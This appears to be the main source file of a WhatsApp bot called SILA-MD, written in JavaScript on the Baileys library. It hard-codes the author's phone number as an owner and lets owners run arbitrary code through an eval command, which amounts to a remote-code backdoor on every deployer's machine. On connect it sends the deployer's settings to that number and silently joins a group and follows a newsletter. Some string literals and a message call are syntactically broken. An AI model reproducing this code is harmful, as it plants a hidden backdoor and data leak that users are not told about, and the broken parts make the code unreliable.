const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const { 
  getBuffer, 
  getGroupAdmins, 
  getRandom, 
  h2k, 
  isUrl, 
  Json, 
  runtime, 
  sleep, 
  fetchJson 
} = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const P = require('pino')
const FileType = require('file-type')
const l = console.log
const config = require('./settings')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const axios = require('axios')
const { File } = require('megajs')
const { exec } = require('child_process');
const { tmpdir } = require('os')
const Crypto = require('crypto')
const Jimp = require('jimp')

 function genMsgId() {
  const prefix = "3EB";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let randomText = prefix;

 for (let i = prefix.length; i < 22; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomText += characters.charAt(randomIndex);
  }   
 return randomText;
}    

const path = require('path')
const msgRetryCounterCache = new NodeCache()
const prefix = config.PREFIX

const ownerNumber = ['255612491554'];
//================== SESSION ==================
if (!fs.existsSync(__dirname + '/session/creds.json')) {
    if (!config.SESSION_ID) return console.log("Please Add SESSION_ID ➾")
      const sessdata = config.SESSION_ID.split("Silva~")[1];
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
      filer.download((err, data) => {
        if (err) throw err
        fs.writeFile(__dirname + '/session/creds.json', data, () => {
          console.log("Session download completed !!")
        })
      })
    
  }

//==================  PORTS ==================

const express = require("express");
const app = express();
const port = process.env.PORT || 9000;

async function connectToWA() {;
	console.log("Connecting SILA-MD🔃");
    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + '/session/')
    const conn = makeWASocket({
        logger: P({
            level: "fatal"
        }).child({
            level: "fatal"
        }),
        printQRInTerminal: true,
        generateHighQualityLinkPreview: true,
        auth: state,
        defaultQueryTimeoutMs: undefined,
        msgRetryCounterCache
    })

  conn.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect
        } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {

            console.log('Installing plugins 🧬... ')
			 console.log(' Bot connected ✅')
		const inviteCode =`IYh8ZzJZfuX3wCHhfyip8g`
conn.groupAcceptInvite(inviteCode);	

                // image with caption
         await conn.sendMessage(
           "255612491554@s.whatsapp.net",
         {
       image: { url: "https://files.catbox.moe/ebj284.jpg" }, // image url
       caption: `> Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _SILA-MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ Comming Soon 😐👊'
     }
   );		
			// image with caption
         await conn.sendMessage(
           "255612491554@s.whatsapp.net",
         {
       image: { url: "https://files.catbox.moe/ebj284.jpg" }, // image url
       caption: `> Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _SILA-MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ Comming Soon 😐👊'
   );
	
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('SILA-MD Plugins Installed 📂')
            console.log(' Bot connected ✅')
	 
	 // bot connected notification without admin variable
conn.sendMessage("255612491554@s.whatsapp.net", { text: "*┏╸╸╸╸╸╸╸╸╸⚃* *CURRENT SETTINGS* *⚃* \n\n*♾️ AUTO_READ_STATUS:* ➠ " + config.AUTO_READ_STATUS + " \n*♾️ MODE:* ➠ " + config.MODE + " \n*♾️ BOT_NAME:* ➠ " + config.BOT_NAME + " \n*♾️ AUTO_VOICE:* ➠ " + config.AUTO_VOICE + " \n*♾️ AUTO_REPLY:* ➠ " + config.AUTO_REPLY + " \n*♾️ ALIVE_IMG:* ➠ " + config.ALIVE_IMG + " \n*♾️ ALIVE_MSG:* ➠ " + config.ALIVE_MSG + " \n*♾️ PREFIX:* ➠ [" + config.PREFIX + "] \n*♾️ AUTO_RECORDING:* ➠ " + config.AUTO_RECORDING + " \n*♾️ AUTO_TYPING:* ➠ " + config.AUTO_TYPING + " \n*┗╸╸╸╸╸╸╸╸╸⚃*\n\n```Sila md Started.Command Now...✅```" });
conn.sendMessage("255612491554@s.whatsapp.net", { text: "*┏╸╸╸╸╸╸╸╸╸⚃* *CURRENT SETTINGS* *⚃* \n\n*♾️ AUTO_READ_STATUS:* ➠ " + config.AUTO_READ_STATUS + " \n*♾️ MODE:* ➠ " + config.MODE + " \n*♾️ BOT_NAME:* ➠ " + config.BOT_NAME + " \n*♾️ AUTO_VOICE:* ➠ " + config.AUTO_VOICE + " \n*♾️ AUTO_REPLY:* ➠ " + config.AUTO_REPLY + " \n*♾️ ALIVE_IMG:* ➠ " + config.ALIVE_IMG + " \n*♾️ ALIVE_MSG:* ➠ " + config.ALIVE_MSG + " \n*♾️ PREFIX:* ➠ [" + config.PREFIX + "] \n*♾️ AUTO_RECORDING:* ➠ " + config.AUTO_RECORDING + " \n*♾️ AUTO_TYPING:* ➠ " + config.AUTO_TYPING + " \n*┗╸╸╸╸╸╸╸╸╸⚃*\n\n```Sila md  Started.Command Now...✅```" });
//================== CONNECT MG ==================

let up = `> Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _SILA MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ Comming Soon😐👊\n╰───────────❍\n╭───❍「 *🫳JOIN CHANNEL* 」\n┃ https://chat.whatsapp.com/IdGNaKt80DEBqirc2ek4ks\n┃\n┃ https://whatsapp.com/channel/0029VbBPxQTJUM2WCZLB6j28\n╰───────────❍\n╭───❍「 *👤BOT OWNERS* 」\n┃ _Mr.Sasampa_\n┃ _Mr.hacker_Sila_\n╰───────────❍\n╭───❍「 *📈SYSTEM STATUS* 」\n┃ ░░░░░░░░░░░░░░░░░░░ 100%\n╰───────────❍\n╭───❍「 *📍BOT PREFIX* 」\n┃ _Configure Your Prefix_ [ ${prefix} ]\n╰───────────❍\n╭───❍「 *⚙️AUTOMATION BY* 」\n┃ *SILA TECH 🧚*\n╰───────────❍`;

conn.sendMessage(conn.user.id,{ text: up, contextInfo: {
        mentionedJid: [''],
        groupMentions: [],
        //forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363422610520277@newsletter',
          newsletterName: "< |  SILA TECH ",
          serverMessageId: 999
        },
        externalAdReply: { 
          title: '♣ SILA MD ♣\nSuccessfully Connected..!',
          body: '𝙿𝙾𝚆𝙴𝚁𝙳 𝙱𝚈 𝚂𝙸𝙻𝙰 𝙼𝙳',
          mediaType: 1,
          sourceUrl: "",
          thumbnailUrl: "https://files.catbox.moe/ebj284.jpg",
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      } 
})

}
})

 //=============ANTI-DELETE DETECT=================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 

const { startAutoBio } = require("./plugins/auto-bio");

conn.ev.on("connection.update", (update) => {
  if (update.connection === "open" && config.AUTO_BIO.toLowerCase() === "true") {
    startAutoBio(conn);
  }
});

							  
conn.ev.on('creds.update', saveCreds)  

    conn.ev.on('messages.upsert', async (mek) => {
      try {
            mek = mek.messages[0]
            if (!mek.message) return
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message

//================== AUTO STATUS VIEW ==================

if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
await conn.readMessages([mek.key])  
const mnyako = await jidNormalizedUser(conn.user.id)
await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: '🖤'}}, { statusJidList: [mek.key.participant, mnyako] })
}

if (mek.key && mek.key.remoteJid === 'status@broadcast') return
const m = sms(conn, mek)
var smg = m
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid

//================== QUOTED ==================

const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []

//================== C FOLLOW ==================

const metadata = await conn.newsletterMetadata("jid", "120363422610520277@newsletter");
if (metadata.viewer_metadata === null) {
  await conn.newsletterFollow("120363422610520277@newsletter");
  console.log("SILA MD CHANNEL FOLLOWED ✅");
}


//================== BODY ==================

const body = 
  (type === 'conversation') ? mek.message.conversation :
  (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
  (type === 'imageMessage' && mek.message.imageMessage.caption) ? mek.message.imageMessage.caption :
  (type === 'videoMessage' && mek.message.videoMessage.caption) ? mek.message.videoMessage.caption :
  (type === 'templateButtonReplyMessage' && mek.message.templateButtonReplyMessage.selectedId) ? mek.message.templateButtonReplyMessage.selectedId :
  (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId :
  (type === 'listResponseMessage' && mek.message.listResponseMessage.singleSelectReply.selectedRowId) ? mek.message.listResponseMessage.singleSelectReply.selectedRowId :
  (type === 'interactiveResponseMessage' &&
    mek.message.interactiveResponseMessage.nativeFlowResponseMessage &&
    JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id
  ) ? JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
  ''
      

	          const isCmd = body.startsWith(prefix)	    
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
            const args = body.trim().split(/ +/).slice(1)
            const q = args.join(' ')
            const isGroup = from.endsWith('@g.us')
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const pushname = mek.pushName || 'SILA MD'
	          const ownbot = config.OWNER_NUMBER
	          const isownbot = ownbot?.includes(senderNumber)
	          const developers = ['255612491554']
            const isbot = botNumber.includes(senderNumber)
	          const isdev = developers.includes(senderNumber) 	    
	          const botNumber2 = await jidNormalizedUser(conn.user.id)
            const isCreator = [ botNumber2 ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)	  
	          const isMe = isbot ? isbot : isdev
            const isOwner = ownerNumber.includes(senderNumber) || isMe
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
            const groupName = isGroup ? groupMetadata.subject : ''
            const participants = isGroup ? await groupMetadata.participants : ''
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
            const isreaction = m.message.reactionMessage ? true : false
            const isReact =m.message.reactionMessage ? true : false
	    const isAnti = (teks) => {
                let getdata = teks
                for (let i = 0; i < getdata.length; i++) {
                    if (getdata[i] === from) return true
                }
                return false
            }
            const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
    
conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}


//================== For RVO ==================
       
        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
                let quoted = message.msg ? message.msg : message
                let mime = (message.msg || message).mimetype || ''
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
                const stream = await downloadContentFromMessage(quoted, messageType)
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                let type = await FileType.fromBuffer(buffer)
                trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
                    // save to file
                await fs.writeFileSync(trueFileName, buffer)
                return trueFileName
            }

//================== FORWARD ==================
       
conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message                             
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
}

//================== OWNER REACT ==================
       
if (
  senderNumber.includes("255612491554") || 
  senderNumber.includes("255612491554")
) {
  if (isReact) return
  m.react("👨‍💻")
}


//================== WORK TYPE ==================
       
if(!isOwner && config.MODE === "private") return 
if(!isOwner && isGroup && config.MODE === "inbox") return 
if(!isOwner && !isGroup && config.MODE === "groups") return 

//================== PLUGIN MAP ==================
       
const events = require('./lib/command')
const cmdName = isCmd ?  command : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, botNumber2 });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, botNumber2 });
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , botNumber2 });
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body,  isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , botNumber2 });
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , botNumber2 });
  }
});




            switch (command) {
        case 'jid':
        reply(from)
        break
        
        default:				
        if (isOwner && body.startsWith('$')) {
        let bodyy = body.split('$')[1]
        let code2 = bodyy.replace("°", ".toString()");
        try {
        let resultTest = await eval(code2);
        if (typeof resultTest === "object") {
        reply(util.format(resultTest));
        } else {
        reply(util.format(resultTest));
        }
        } catch (err) {
        reply(util.format(err));
        }}}
        } catch (e) {
            const isError = String(e)
            console.log(isError)
        }
    })
}
app.get("/", (req, res) => {
res.send("SILA MD CONNECTED SUCCESSFULLY ✅");
});
app.listen(port, () => console.log(`SILA MD Server listening on port http://localhost:` + port));
setTimeout(() => {
connectToWA()
}, 9000);
    
